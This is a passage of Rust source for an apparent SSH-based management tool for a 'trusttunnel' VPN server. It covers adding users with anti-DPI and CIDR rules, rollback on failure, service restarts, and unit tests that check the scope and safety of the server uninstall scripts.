    let (_, code) = exec_command(handle, app, &rotate_cmd).await?;
    if code == 9 {
        return Err("SSH_ROTATE_USER_NOT_FOUND".into());
    }
    if code != 0 {
        return Err(format!(
            "{{\"kind\":\"SSH_ROTATE_PARTIAL_FAILED\",\"was_rolled_back\":true,\"exit_code\":{code}}}"
        ));
    }

    // Restart service non-blocking — best effort
    let _ = exec_command(
        handle, app,
        &format!("{sudo}systemctl --no-block restart trusttunnel"),
    ).await;

    Ok(())
}

/// Add a user with credentials.toml entry AND optional rules.toml per-user rule (anti-DPI + CIDR).
/// Returns generated deeplink URI string.
///
/// CR-01 revision: `pin_certificate_der` is now `Option<String>` carrying a Base64-encoded
/// DER leaf certificate. Tauri+serde serialize `Vec<u8>` as an array of numbers, which the
/// frontend cannot produce from the `leaf_der_b64` string returned by
/// `server_fetch_endpoint_cert`. Base64 is the canonical wire format; we decode locally.
///
/// Audit CQ-4 (ln-624): the 12 business-logic args were collected into
/// `AddUserRequest` to satisfy `clippy::too_many_arguments` and to give
/// the Tauri command a single typed payload instead of an opaque arg list.
/// `app` and `handle` remain separate because they are SSH-pool/runtime
/// infrastructure, not business inputs.
#[derive(Debug, Clone, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct AddUserRequest {
    pub vpn_username: String,
    pub vpn_password: String,
    pub anti_dpi: bool,
    pub prefix_length: Option<u32>,
    pub prefix_percent: Option<u32>,
    pub cidr: Option<String>,
    pub custom_sni: Option<String>,
    pub name: Option<String>,
    pub upstream_protocol: Option<String>,
    pub skip_verification: bool,
    pub pin_certificate_der: Option<String>,
    pub dns_upstreams: Vec<String>,
}

pub async fn server_add_user_advanced(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    req: AddUserRequest,
) -> Result<String, String> {
    // Destructure the request — every subsequent reference still uses the
    // same identifiers the body was written against, so the change is
    // signature-only (single Layer-2 safe refactor per ln-624 brief).
    let AddUserRequest {
        vpn_username,
        vpn_password,
        anti_dpi,
        prefix_length,
        prefix_percent,
        cidr,
        custom_sni,
        name,
        upstream_protocol,
        skip_verification,
        pin_certificate_der,
        dns_upstreams,
    } = req;
    validate_vpn_username(&vpn_username)?;
    validate_vpn_password(&vpn_password)?;
    if let Some(c) = &cidr {
        crate::ssh::sanitize::validate_cidr(c)?;
    }
    if let Some(sni) = &custom_sni {
        crate::ssh::sanitize::validate_fqdn_sni(sni)?;
    }
    if let Some(n) = &name {
        crate::ssh::sanitize::validate_display_name(n)?;
    }
    crate::ssh::sanitize::validate_dns_list(&dns_upstreams)?;
    // CR-01: decode base64 DER (with size cap) once here, pass raw bytes downstream.
    let pin_certificate_der_bytes: Option<Vec<u8>> = match pin_certificate_der {
        Some(ref s) if !s.is_empty() => Some(super::decode_cert_der_b64(s)?),
        _ => None,
    };

    let prefix_length = prefix_length.unwrap_or(4).clamp(1, 16);
    let prefix_percent = prefix_percent.unwrap_or(70).clamp(1, 100);

    // Step 1: create credentials.toml entry (reuse existing function).
    // WR-04: skip_restart=true here — the coalesced restart below after
    // Step 2 covers both credentials.toml and optional rules.toml writes,
    // so we avoid the double disconnect cycle every other client on the
    // server would otherwise see during a single admin action.
    add_server_user_internal(
        app,
        handle,
        vpn_username.clone(),
        vpn_password.clone(),
        true,
    )
    .await?;

    // FIX-OO-14: auto-rollback when steps 2–3 fail. Without this, hitting
    // an error like "custom SNI not in allowed_sni" after credentials.toml
    // is written leaves an orphan user the operator has to hand-clean.
    // Wrap the rest in an async block and, on Err, run server_remove_user
    // before propagating the error so the modal shows a clean retry path
    // instead of the scary "пользователь МОГ быть создан частично" message.
    let pin_certificate_der_b64 = pin_certificate_der_bytes
        .as_ref()
        .map(|b| base64::Engine::encode(&base64::engine::general_purpose::STANDARD, b));
    let vpn_username_for_body = vpn_username.clone();
    let custom_sni_for_body = custom_sni.clone();
    let name_for_body = name.clone();
    let upstream_protocol_for_body = upstream_protocol.clone();
    let pin_b64_for_body = pin_certificate_der_b64.clone();
    let dns_upstreams_for_body = dns_upstreams.clone();

    let body: Result<String, String> = async {
        // Step 2: generate anti-DPI prefix (client-side secure random) and write rules.toml
        let generated_prefix: Option<String> = if anti_dpi {
            use rand::RngCore;
            let mut buf = vec![0u8; prefix_length as usize];
            rand::thread_rng().fill_bytes(&mut buf);
            Some(buf.iter().map(|b| format!("{:02x}", b)).collect())
        } else {
            None
        };
        let _ = prefix_percent; // stored at connect-time by upstream endpoint

        if anti_dpi || cidr.is_some() {
            let sudo = detect_sudo(handle, app).await;
            let dir = ENDPOINT_DIR;
            let (content, _) = exec_command(
                handle, app,
                &format!("{sudo}cat {dir}/rules.toml 2>/dev/null || echo ''"),
            ).await?;

            let updated = super::add_user_rule(
                &content,
                &vpn_username_for_body,
                generated_prefix.as_deref(),
                cidr.as_deref(),
            )?;
            let escaped = updated.replace('\\', "\\\\").replace('$', "\\$").replace('`', "\\`");
            // WR-04: randomized delimiter — rules.toml content includes user-controlled
            // values (CIDR, username comments) that could collide with a fixed sentinel.
            let delim = format!("RULES_EOF_{}", uuid::Uuid::new_v4().simple());
            let write_cmd = format!(
                "{sudo}tee {dir}/rules.toml > /dev/null << '{delim}'\n{escaped}\n{delim}"
            );
            let (_, code) = exec_command(handle, app, &write_cmd).await?;
            if code != 0 {
                return Err(format!("SSH_RULES_WRITE_FAILED|{code}"));
            }
        }

        // WR-04 (14.1-REVIEW deep pass): single restart for the whole add-user
        // pipeline. Step 1 was run with skip_restart=true so that this restart
        // covers BOTH credentials.toml (needs restart to activate the new user)
        // AND rules.toml (RulesEngine::from_config is start-time only). Before
        // this coalescing, operators saw two restart cycles (→ two disconnect/
        // reconnect flashes for every OTHER client on the server) per admin
        // action. --no-block keeps the SSH channel free while systemd does the
        // stop/start. Exit code swallowed — the deeplink is the primary output
        // and a failed restart is a soft warning surfaced via activity log.
        {
            let sudo = detect_sudo(handle, app).await;
            let _ = exec_command(
                handle,
                app,
                &format!("{sudo}systemctl --no-block restart trusttunnel 2>&1"),
            )
            .await;
        }

        // Step 3: generate deeplink with all TLV fields. This is the step that
        // can reject a bad `custom_sni` (endpoint CLI checks allowed_sni in
        // hosts.toml) — rollback kicks in when this returns Err.
        let deeplink = super::export_config_deeplink_advanced(
            app, handle,
            vpn_username_for_body.clone(),
            custom_sni_for_body,
            name_for_body,
            upstream_protocol_for_body,
            anti_dpi,
            skip_verification,
            pin_b64_for_body,
            dns_upstreams_for_body,
        ).await?;

        Ok(deeplink)
    }.await;

    let deeplink = match body {
        Ok(dl) => dl,
        Err(e) => {
            // Rollback: remove the user from credentials.toml + rules.toml +
            // users-advanced.toml so the operator retries from a clean slate
            // rather than hunting for an orphan. Failures here are
            // best-effort logged — the outer error is what matters.
            emit_log(
                app,
                "warn",
                &format!(
                    "Add-user pipeline failed after credentials write, rolling back: {e}"
                ),
            );
            let _ = server_remove_user(app, handle, vpn_username.clone()).await;
            // server_remove_user doesn't touch rules.toml — wipe the
            // freshly-written allow rule too, so retrying with the same
            // username doesn't collide on the comment marker.
            let sudo = detect_sudo(handle, app).await;
            let dir = ENDPOINT_DIR;
            if let Ok((content, _)) = exec_command(
                handle, app,
                &format!("{sudo}cat {dir}/rules.toml 2>/dev/null || echo ''"),
            ).await {
                if let Ok(cleaned) = super::remove_user_rule(&content, &vpn_username) {
                    let escaped =
                        cleaned.replace('\\', "\\\\").replace('$', "\\$").replace('`', "\\`");
                    let delim = format!("RULES_EOF_{}", uuid::Uuid::new_v4().simple());
                    let _ = exec_command(
                        handle, app,
                        &format!(
                            "{sudo}tee {dir}/rules.toml > /dev/null << '{delim}'\n{escaped}\n{delim}"
                        ),
                    ).await;
                }
            }
            return Err(format!("ADD_USER_ROLLED_BACK|{e}"));
        }
    };

    // Step 4 (FIX-NN): persist TLV params in our sidecar file so Edit /
    // FileText reopen / Download .toml can read them back later. Server
    // protocol doesn't store these — without this step the user's choices
    // evaporate the moment the modal closes (see 14.1-HANDOFF FIX-NN).
    //
    // Best-effort — the deeplink is already in the user's hand at this
    // point, so a write failure here must NOT undo Steps 1..3. Surface
    // via emit_log so the failure shows up in Activity Log without
    // poisoning the success path.
    let advanced = super::users_advanced::UserAdvanced {
        username: vpn_username,
        display_name: name,
        custom_sni,
        upstream_protocol,
        skip_verification,
        pin_cert_der_b64: pin_certificate_der_b64,
        dns_upstreams,
        anti_dpi,
    };
    if let Err(e) = super::users_advanced::upsert_user_advanced(app, handle, advanced).await {
        emit_log(app, "warn", &format!("users-advanced.toml write failed: {e}"));
    }
    Ok(deeplink)
}

/// Update per-user rules.toml entry: CIDR restriction and/or anti-DPI prefix.
///
/// B6 revision: accepts `anti_dpi: bool` and `regenerate_prefix: bool` flags rather than
/// a raw prefix string — the frontend never sees the prefix hex value directly.
pub async fn server_update_user_config(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    username: String,
    cidr: Option<String>,
    anti_dpi: bool,
    regenerate_prefix: bool,
) -> Result<super::UserRule, String> {
    validate_vpn_username(&username)?;
    if let Some(c) = &cidr {
        crate::ssh::sanitize::validate_cidr(c)?;
    }

    let sudo = detect_sudo(handle, app).await;
    let dir = ENDPOINT_DIR;
    let (content, _) = exec_command(
        handle, app,
        &format!("{sudo}cat {dir}/rules.toml 2>/dev/null || echo ''"),
    ).await?;

    let existing = super::find_user_rule(&content, &username)?;
    let new_prefix: Option<String> = if !anti_dpi {
        None // anti_dpi OFF → clear prefix
    } else if regenerate_prefix {
        use rand::RngCore;
        let mut buf = vec![0u8; 4];
        rand::thread_rng().fill_bytes(&mut buf);
        Some(buf.iter().map(|b| format!("{:02x}", b)).collect())
    } else {
        match existing.as_ref().and_then(|r| r.client_random_prefix.clone()) {
            Some(p) => Some(p),
            None => {
                use rand::RngCore;
                let mut buf = vec![0u8; 4];
                rand::thread_rng().fill_bytes(&mut buf);
                Some(buf.iter().map(|b| format!("{:02x}", b)).collect())
            }
        }
    };

    let removed = super::remove_user_rule(&content, &username)?;
    let updated = super::add_user_rule(
        &removed, &username,
        new_prefix.as_deref(),
        cidr.as_deref(),
    )?;
    let escaped = updated.replace('\\', "\\\\").replace('$', "\\$").replace('`', "\\`");
    // WR-04: randomized delimiter (see notes above).
    let delim = format!("RULES_EOF_{}", uuid::Uuid::new_v4().simple());
    let write_cmd = format!(
        "{sudo}tee {dir}/rules.toml > /dev/null << '{delim}'\n{escaped}\n{delim}"
    );
    let (_, code) = exec_command(handle, app, &write_cmd).await?;
    if code != 0 {
        return Err(format!("SSH_UPDATE_CONFIG_FAILED|{code}"));
    }
    // CIDR / anti-DPI правила читаются upstream'ом только при старте
    // (`RulesEngine::from_config` в lib/src/settings.rs — не hot-reload).
    // Без рестарта изменённые rules.toml никогда не применяются — юзер
    // продолжает подключаться со старым allow-list. --no-block чтобы SSH
    // канал не висел пока systemd делает stop/start.
    let _ = exec_command(
        handle, app,
        &format!("{sudo}systemctl --no-block restart trusttunnel"),
    ).await;
    Ok(super::UserRule { client_random_prefix: new_prefix, cidr })
}

/// Regenerate the anti-DPI client_random_prefix for an existing user.
/// Old prefix is invalidated in existing deeplinks.
///
/// WR-03 (14.1-REVIEW deep pass): before this fix, the call delegated to
/// `server_update_user_config(..., cidr=None, ...)`, which made
/// `add_user_rule` emit a brand-new rule WITHOUT the existing cidr — silently
/// dropping the subnet restriction when the operator intended a rotation.
/// Fix: read rules.toml first, recover the existing cidr for this user, and
/// pass it through so the cidr invariant survives the rotation.
pub async fn server_regenerate_client_prefix(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
    prefix_length: u32,
    prefix_percent: u32,
) -> Result<String, String> {
    validate_vpn_username(&vpn_username)?;
    let plen = prefix_length.clamp(1, 16);
    let _pct = prefix_percent.clamp(1, 100); // stored at connect-time

    use rand::RngCore;
    let mut buf = vec![0u8; plen as usize];
    rand::thread_rng().fill_bytes(&mut buf);
    let new_prefix: String = buf.iter().map(|b| format!("{:02x}", b)).collect();

    // WR-03: preserve existing cidr from rules.toml. If this read fails we
    // fall back to None (same as pre-fix behaviour) — the operator will see
    // the error but the delegate call still runs so the rotation can retry.
    let sudo = detect_sudo(handle, app).await;
    let existing_cidr = match exec_command(
        handle,
        app,
        &format!(
            "{sudo}cat {dir}/rules.toml 2>/dev/null || echo ''",
            dir = ENDPOINT_DIR,
        ),
    )
    .await
    {
        Ok((content, _)) => super::find_user_rule(&content, &vpn_username)
            .ok()
            .flatten()
            .and_then(|r| r.cidr),
        Err(_) => None,
    };

    // Delegate update with regenerate_prefix=true; cidr preserved from existing rule
    server_update_user_config(app, handle, vpn_username, existing_cidr, true, true).await?;
    Ok(new_prefix)
}

/// TLS cert probe — does NOT use SSH. Takes handle for macro signature consistency.
///
/// FIX-OO-13: `hostname` is where to TCP-connect (the real endpoint —
/// usually sshParams.host). `sni_host` is the TLS SNI value; for the
/// anti-DPI use-case these differ, and the probe must connect to the
/// real endpoint's IP while sending a decoy SNI that the server whitelists
/// via its `allowed_sni` config. If `sni_host` is empty the probe uses
/// `hostname` for both — matching pre-FIX-OO-13 behavior.
pub async fn server_fetch_endpoint_cert(
    _app: &tauri::AppHandle,
    _handle: &client::Handle<SshHandler>,
    hostname: String,
    cert_port: u16,
    sni_host: Option<String>,
) -> Result<super::EndpointCertInfo, String> {
    let sni = sni_host
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or(&hostname);
    super::fetch_endpoint_cert(&hostname, cert_port, sni).await
}

/// Read rules.toml for a single username and return their rule config.
pub async fn server_get_user_config(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
) -> Result<Option<super::UserRule>, String> {
    validate_vpn_username(&vpn_username)?;
    let sudo = detect_sudo(handle, app).await;
    let dir = ENDPOINT_DIR;
    let (content, _) = exec_command(
        handle, app,
        &format!("{sudo}cat {dir}/rules.toml 2>/dev/null || echo ''"),
    ).await?;
    super::find_user_rule(&content, &vpn_username)
}

#[cfg(test)]
mod tests {
    use super::{
        build_fail2ban_deprovision, build_pkg_marker_probe, build_probe_script,
        build_stop_in_progress, build_ufw_deprovision, build_uninstall_extras,
        build_uninstall_script, derive_partial, parse_pkg_marker_probe, UninstallSelection,
    };
    use super::super::snapshot::PreInstallSnapshot;

    // ── Phase 18 test helpers: build a UninstallSelection / PreInstallSnapshot with the
    //    one axis a test cares about, leaving the rest at a neutral default. ──

    /// A snapshot that PROVES ufw / fail2ban / telemt were ABSENT and BBR was OFF before
    /// us — i.e. everything is «ours», so every fold + purge is eligible. Individual tests
    /// override the single field they exercise.
    fn snapshot_all_ours() -> PreInstallSnapshot {
        PreInstallSnapshot {
            schema_version: 1,
            occupied_ports: vec![],
            ufw_present: false,
            ufw_active: false,
            ufw_rules: vec![],
            fail2ban_present: false,
            fail2ban_enabled: false,
            mtproto_present: false,
            bbr_value: "cubic".to_string(),
            ufw_manual: false,
            fail2ban_manual: false,
        }
    }

    // ── build_stop_in_progress: cancel must kill OUR deploy group, heal dpkg,
    //    and NEVER broad-kill the system's apt (05-UAT 2026-06-09) ──

    // ── 06-14 C-07 / D-29: the add-user failures emit translatable SSH_* codes and
    //    the duplicate-user code carries ONLY the username, never the password. ──

    #[test]
    fn test_add_user_emits_translatable_codes_carrying_no_secret() {
        let src = include_str!("server_install.rs");
        // The two raw-English add-user failures are now translatable codes.
        assert!(
            src.contains("\"SSH_CREDENTIALS_NOT_FOUND\""),
            "credentials-missing must emit SSH_CREDENTIALS_NOT_FOUND (C-07)"
        );
        assert!(
            src.contains("SSH_USER_ALREADY_EXISTS|"),
            "duplicate-user must emit SSH_USER_ALREADY_EXISTS|{{username}} (C-07)"
        );
        // The duplicate-user code interpolates ONLY the username, never the password.
        // Inspect the exact `format!("SSH_USER_ALREADY_EXISTS|...` line in the source so
        // the D-29 check cannot self-match other text elsewhere in this file.
        let dup_line = src
            .lines()
            .find(|l| l.contains("let msg = format!(\"SSH_USER_ALREADY_EXISTS|"))
            .expect("duplicate-user code line must exist");
        assert!(
            dup_line.contains("vpn_username"),
            "duplicate-user code must carry the username: {dup_line}"
        );
        assert!(
            !dup_line.contains("vpn_password") && !dup_line.contains("password"),
            "D-29: the duplicate-user code must NEVER carry the password: {dup_line}"
        );
        // The old raw-English LEAD strings are no longer RETURNED (scan only the
        // `let msg = ...` assignment lines so this guard cannot self-match its own text).
        let msg_lines: Vec<&str> = src
            .lines()
            .filter(|l| l.trim_start().starts_with("let msg ="))
            .collect();
        assert!(
            !msg_lines.iter().any(|l| l.contains("credentials.toml not found")),
            "raw-English credentials-missing string must be replaced by a code"
        );
        assert!(
            !msg_lines.iter().any(|l| l.contains("already exists on server")),
            "raw-English duplicate-user string must be replaced by a code"
        );
    }

    #[test]
    fn test_stop_in_progress_kills_recorded_group_and_heals_dpkg() {
        let s = build_stop_in_progress("sudo ");
        // Reads the PGID our deploy recorded, then TERM- then KILL-signals that GROUP
        // (negative pid). The -gt 1 guard prevents ever signalling our own group / 0.
        assert!(s.contains("/tmp/tt_deploy.pid"), "must read the recorded deploy PGID");
        assert!(s.contains(r#"[ "$TT_PGID" -gt 1 ]"#), "must guard against pgid <= 1 (self/0)");
        assert!(s.contains(r#"kill -TERM -"$TT_PGID""#), "must TERM the recorded GROUP");
        assert!(s.contains(r#"kill -KILL -"$TT_PGID""#), "must KILL the group if TERM is ignored");
        assert!(s.contains("dpkg --configure -a"), "must heal a half-finished dpkg transaction");
    }

    #[test]
    fn test_stop_in_progress_never_broad_kills_system_apt() {
        // Scoping invariant: we only ever signal the recorded group — never a broad
        // `pkill apt` / `killall apt-get` that would hit the system's unattended-upgrades.
        let s = build_stop_in_progress("sudo ");
        assert!(!s.contains("pkill"), "must not broad-pkill (would hit system apt)");
        assert!(!s.contains("killall"), "must not killall (would hit system apt)");
        assert!(!s.contains("apt-get"), "must not signal apt-get by name");
    }

    // ── build_probe_script: probe SHELL pinned to the REAL artifact chain (Codex #4
    //    + #14, round-2 finding A — mocked frontend flows do not cover this) ──

    #[test]
    fn probe_script_references_real_install_artifact_chain() {
        // Snapshot: the probe's per-stage construction must reference EVERY artifact
        // the deploy writes, so the server-verified resume model can never silently
        // drift from what deploy produced (Codex #4 closed end-to-end at the backend).
        let s = build_probe_script("sudo ", "PROBE_EOF_test");
        // Canonical install dir + the binary marker.
        assert!(s.contains("/opt/trusttunnel/setup_wizard"), "missing install dir + binary: {s}");
        // The four config files deploy_configure writes.
        assert!(s.contains("/opt/trusttunnel/credentials.toml"));
        assert!(s.contains("/opt/trusttunnel/rules.toml"));
        assert!(s.contains("/opt/trusttunnel/vpn.toml"));
        assert!(s.contains("/opt/trusttunnel/hosts.toml"));
        // The cert path — BOTH layouts (LE live/ symlink OR local certs/cert.pem).
        assert!(s.contains("/etc/letsencrypt/live/"));
        assert!(s.contains("/opt/trusttunnel/certs/cert.pem"));
        // The systemd unit file + the enable check (the `enable --now` chain, finding G).
        assert!(s.contains("/etc/systemd/system/trusttunnel.service"));
        assert!(s.contains("systemctl is-enabled trusttunnel"));
    }

    #[test]
    fn probe_script_uses_dynamic_uuid_heredoc_delim_not_static() {
        // round-2 finding J / WR-04: the probe heredoc delimiter is dynamic
        // (PROBE_EOF_<uuid>), never a static `USER_EOF`. The helper interpolates
        // whatever delim it is given — assert it uses THAT delim and carries no static
        // delimiter literal.
        let s = build_probe_script("sudo ", "PROBE_EOF_deadbeef");
        assert!(s.contains("<< 'PROBE_EOF_deadbeef'"), "delim not used in heredoc open: {s}");
        assert!(s.trim_end().ends_with("PROBE_EOF_deadbeef"), "delim not used to close heredoc");
        assert!(!s.contains("USER_EOF"), "static heredoc delimiter must not appear");
    }

    #[test]
    fn uninstall_extras_references_systemd_and_full_lifecycle() {
        // Codex #14: the uninstall (combined with the systemd stop/disable in the
        // outer uninstall_script) must clean the SAME lifecycle the probe inspects —
        // here we pin the EXTRAS to the cert/firewall tail of that lifecycle (the
        // systemd unit removal lives in the outer script; the LE + firewall removal
        // is what build_uninstall_extras owns). Assert the LE + both firewall layers.
        let s = build_uninstall_extras("sudo ", "example.com", 2222);
        assert!(s.contains("certbot delete"), "LE certbot delete missing");
        assert!(s.contains("/etc/letsencrypt/live/example.com"), "LE live dir removal missing");
        assert!(s.contains("ufw status numbered"), "ownership-scoped ufw removal missing");
        assert!(s.contains("--comment trusttunnel-managed"), "ownership-scoped iptables removal missing");
    }

    // ── build_uninstall_extras: ownership-scoped full-clean uninstall (D-04, Codex #7
    //    + round-2 finding A + round-3 HIGH A) ──

    #[test]
    fn uninstall_extras_removes_letsencrypt_state() {
        let s = build_uninstall_extras("sudo ", "example.com", 2222);
        // certbot delete for the host AND rm -rf of the LE state dirs.
        assert!(s.contains("certbot delete --cert-name example.com"));
        assert!(s.contains("/etc/letsencrypt/live/example.com"));
        assert!(s.contains("/etc/letsencrypt/archive/example.com"));
        assert!(s.contains("/etc/letsencrypt/renewal/example.com.conf"));
    }

    #[test]
    fn uninstall_extras_deletes_iptables_by_tag_not_by_port_shape() {
        let s = build_uninstall_extras("sudo ", "example.com", 2222);
        // iptables removal must carry the ownership TAG on the -D for 80 AND 443.
        assert!(s.contains("iptables -D INPUT -p tcp --dport 80 -j ACCEPT -m comment --comment trusttunnel-managed"));
        assert!(s.contains("iptables -D INPUT -p tcp --dport 443 -j ACCEPT -m comment --comment trusttunnel-managed"));
        // NO-BROAD-DELETE assertion (round-3 HIGH A): an UNTAGGED iptables -D on
        // those ports would clobber a pre-existing admin ACCEPT rule. Prove no such
        // untagged delete line exists.
        for line in s.lines() {
            let l = line.trim();
            if l.contains("iptables -D") && l.contains("--dport 80") {
                assert!(
                    l.contains("-m comment --comment trusttunnel-managed"),
                    "untagged iptables -D on port 80 found (would clobber admin rule): {l}"
                );
            }
            if l.contains("iptables -D") && l.contains("--dport 443") {
                assert!(
                    l.contains("-m comment --comment trusttunnel-managed"),
                    "untagged iptables -D on port 443 found (would clobber admin rule): {l}"
                );
            }
        }
    }

    #[test]
    fn uninstall_extras_deletes_ufw_by_comment_not_by_spec() {
        let s = build_uninstall_extras("sudo ", "example.com", 2222);
        // ufw removal must scope to OUR comments via `ufw status numbered`.
        assert!(s.contains("ufw status numbered"));
        assert!(s.contains("trusttunnel-acme"));
        assert!(s.contains("trusttunnel-tls"));
        // NO-BROAD-DELETE assertion (round-3 HIGH A): a `ufw ... delete allow 80/tcp`
        // (or 443/tcp) matches an admin's bare rule and is FORBIDDEN. Prove absent.
        assert!(!s.contains("delete allow 80/tcp"), "forbidden broad ufw delete on 80/tcp");
        assert!(!s.contains("delete allow 443/tcp"), "forbidden broad ufw delete on 443/tcp");
    }

    #[test]
    fn uninstall_sweep_spares_the_d05_admin_service_preallows_h03() {
        // H-03: the Step 5c sweep must EXCLUDE the D-05 pre-allow rules (comment
        // 'pre-existing admin service (TrustTunnel)'). Those rules keep the ADMIN's
        // own services reachable through the ufw WE enabled; deleting them while ufw
        // stays active (user unchecked «Брандмауэр») firewalls the admin's service off.
        let s = build_uninstall_extras("sudo ", "example.com", 2222);
        // The sweep pipeline carries an explicit exclusion for the pre-allow tag,
        // alongside the existing SSH-port exclusion.
        assert!(
            s.contains("grep -vE 'pre-existing admin service'"),
            "Step 5c must exclude the D-05 admin-service pre-allows: {s}"
        );
        // Sanity: the exclusion sits inside the same enumerate-then-delete loop that
        // still targets our own trusttunnel-tagged rules.
        let sweep_line = s
            .lines()
            .find(|l| l.contains("for tt_num in"))
            .expect("Step 5c sweep loop present");
        assert!(sweep_line.contains("grep -iE 'trusttunnel|HTTP cert renewal'"), "still sweeps our rules");
        assert!(sweep_line.contains("pre-existing admin service"), "exclusion is part of the sweep pipeline");
    }

    #[test]
    fn uninstall_extras_interpolates_validated_host_verbatim() {
        // host is validated upstream by validate_ssh_host (whitelist — no shell
        // metacharacters). A clean sample is interpolated verbatim into the certbot
        // delete + the LE state paths, so the host name itself introduces no
        // injection vector. (The script's own ufw loop legitimately uses `$(...)`/`;`
        // — that is OUR shell, not attacker-controlled host content.)
        let host = "vpn-1.example.com";
        let s = build_uninstall_extras("sudo ", host, 2222);
        assert!(s.contains(&format!("--cert-name {host}")));
        assert!(s.contains(&format!("/etc/letsencrypt/renewal/{host}.conf")));
        // The validated host carries no metacharacters of its own.
        assert!(!host.contains(';'));
        assert!(!host.contains('`'));
        assert!(!host.contains('$'));
    }

    // ── build_uninstall_script: the COMPLETE uninstall body, COCOON-complete
    //    (06-16 C-15/C-16/C-18/C-20). Pure helper extracted from uninstall_server. ──

    #[test]
    fn uninstall_removes_service_d_dropin_dir_before_daemon_reload() {
        // C-15: the systemd DROP-IN dir created by deploy.rs (mkdir -p
        // /etc/systemd/system/trusttunnel.service.d) must be removed with `rm -rf`
        // (it is a DIRECTORY — `rm -f` cannot remove it, the root cause) and the
        // removal must come BEFORE `systemctl daemon-reload` so the reload re-reads
        // units without our drop-in.
        let s = build_uninstall_script("sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222, 0, false, false, false, None, &UninstallSelection::restore_all(), None);
        assert!(
            s.contains("rm -rf /etc/systemd/system/trusttunnel.service.d"),
            "must rm -rf the .service.d drop-in dir (rm -f cannot remove a dir): {s}"
        );
        let drop_in_off = s
            .find("rm -rf /etc/systemd/system/trusttunnel.service.d")
            .expect("drop-in removal must be present");
        let reload_off = s
            .find("systemctl daemon-reload")
            .expect("daemon-reload must be present");
        assert!(
            drop_in_off < reload_off,
            "the .service.d removal must come BEFORE daemon-reload (drop_in_off={drop_in_off}, reload_off={reload_off})"
        );
    }

    #[test]
    fn uninstall_removes_local_sbin_cert_renew_helper() {
        // C-16: the cert-renew helper deploy.rs writes to /usr/local/sbin must be
        // removed. The glob must be prefixed with `trusttunnel` (OUR files only) —
        // never a bare /usr/local/sbin/* that could match a foreign admin script.
        let s = build_uninstall_script("sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222, 0, false, false, false, None, &UninstallSelection::restore_all(), None);
        assert!(
            s.contains("/usr/local/sbin/trusttunnel*"),
            "must remove the orphaned /usr/local/sbin/trusttunnel* cert-renew helper: {s}"
        );
        assert!(
            !s.contains("/usr/local/sbin/*"),
            "must NOT use a bare /usr/local/sbin/* glob (would match foreign files)"
        );
    }

    #[test]
    fn uninstall_smart_purges_ufw_fail2ban_only_when_marker_present_never_other_packages() {
        // post-UAT exception to C-20: ufw + fail2ban (which install_firewall /
        // install_fail2ban can apt-install) ARE purged — but ONLY inside the
        // ownership-marker branches. Admin-shared certbot/curl/iptables are STILL
        // never purged. M-01: the purge is now snapshot-gated too, so use a snapshot
        // that PROVES the packages were absent before us (None/legacy ⇒ no purge).
        let s = build_uninstall_script("sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222, 0, false, false, false, None, &UninstallSelection::restore_all(), Some(&snapshot_all_ours()));
        // The ufw/fail2ban purges exist…
        assert!(s.contains("apt-get purge -y fail2ban"), "fail2ban smart-purge missing");
        assert!(s.contains("apt-get purge -y ufw"), "ufw smart-purge missing");
        // …but ONLY gated behind the ownership markers (never unconditional).
        assert!(s.contains(r#"[ "$TT_INSTALLED_F2B" = "1" ]"#), "fail2ban purge must be marker-gated");
        assert!(s.contains(r#"[ "$TT_INSTALLED_UFW" = "1" ]"#), "ufw purge must be marker-gated");
        // Markers are read from {dir} BEFORE Step 4 removes it.
        assert!(s.contains("/opt/trusttunnel/.tt-installed-fail2ban"), "f2b marker read missing");
        assert!(s.contains("/opt/trusttunnel/.tt-installed-ufw"), "ufw marker read missing");
        assert!(s.contains("/opt/trusttunnel/.tt-enabled-ufw"), "ufw-enabled marker read missing");
        // The marker read must come BEFORE the `rm -rfv {dir}` (else the markers are gone).
        let read_idx = s.find(".tt-installed-ufw").expect("marker read present");
        let rm_idx = s.find("rm -rfv /opt/trusttunnel").expect("Step 4 rm present");
        assert!(read_idx < rm_idx, "markers must be read BEFORE the dir is removed");
        // ufw is disabled before any purge → no SSH lock-out window.
        assert!(s.contains("ufw --force disable"), "ufw must be disabled before purge");
        // Admin-shared packages are STILL never purged (C-20 boundary holds).
        assert!(!s.contains("purge -y certbot"), "must not purge certbot (C-20)");
        assert!(!s.contains("purge -y curl"), "must not purge curl (C-20)");
        assert!(!s.contains("purge -y iptables"), "must not purge iptables (C-20)");
    }

    #[test]
    fn ufw_rule_sweep_matches_real_install_comments_not_just_acme_tls() {
        // BUGFIX (post-UAT): the old sweep grepped only 'trusttunnel-acme|trusttunnel-tls',
        // which the install_firewall comments NEVER contain (they are 'SSH (TrustTunnel)',
        // 'TrustTunnel VPN/QUIC', 'HTTP cert renewal …') → on a live server NO ufw rule was
        // ever removed. The sweep must match the comments install_firewall actually writes.
        let s = build_uninstall_extras("sudo ", "example.com", 2222);
        assert!(
            s.contains("grep -iE 'trusttunnel|HTTP cert renewal'"),
            "ufw sweep must match the real install_firewall comments (trusttunnel / HTTP cert renewal)"
        );
        assert!(
            !s.contains("grep -E 'trusttunnel-acme|trusttunnel-tls'"),
            "the old broken acme/tls-only grep must be gone"
        );
        // Still ownership-scoped: parse `ufw status numbered`, delete BY RULE NUMBER,
        // never a broad `delete allow <port>/tcp` by port spec.
        assert!(s.contains("ufw status numbered"), "ufw sweep must stay comment-scoped");
        assert!(s.contains(r#"ufw --force delete "$tt_num""#), "ufw sweep must delete by rule number via --force (not `yes | ufw delete`)");
        assert!(!s.contains("delete allow 80/tcp"), "no broad ufw delete on 80/tcp");
        assert!(!s.contains("delete allow 443/tcp"), "no broad ufw delete on 443/tcp");
    }

    #[test]
    fn uninstall_protects_active_ssh_port_never_deletes_reasserts_it() {
        // post-UAT server-brick fix: the active SSH port must be SACRED. The ufw sweep
        // must EXCLUDE it by an ANCHORED port token (so 22 never matches 2222), and the
